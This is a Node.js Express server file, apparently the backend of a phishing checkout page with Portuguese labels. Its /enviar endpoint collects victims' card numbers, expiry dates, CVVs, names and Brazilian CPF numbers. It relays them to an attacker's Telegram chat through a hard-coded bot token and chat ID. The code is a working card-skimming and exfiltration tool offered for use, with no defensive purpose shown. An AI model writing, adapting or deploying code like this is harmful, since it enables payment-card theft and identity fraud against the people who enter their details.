import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import fetch from 'node-fetch';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

app.use(express.json());
app.use(express.static('.'));

// Endpoint para enviar dados ao Telegram
app.post('/enviar', async (req, res) => {
    const botToken = "8615676091:AAFV_WXvlSVFhxnHHpPUmm3je4ZHJvhL5fU";
    const chatId = "8309449775";
    
    const data = req.body;
    
    const message = `💳 : NÚMERO DO CARTÃO: ${data.card}\n📅 : VALIDADE DO CARTÃO: ${data.expiry}\n🔐 : CVV DO CARTÃO: ${data.cvv}\n👤 : NOME: ${data.name}\n🇧🇷 : CPF: ${data.cpf}\n🎁 : PLANO: ${data.plano} - R$ ${data.preco}\n⏰ : ${new Date().toLocaleString('pt-BR')}`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: chatId, 
                text: message 
            })
        });
        
        const result = await response.json();
        console.log('Mensagem enviada:', result);
        res.json({ success: true, result });
    } catch (error) {
        console.error('Erro ao enviar:', error);
        res.json({ success: false, error: error.message });
    }
});

// Servir o index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});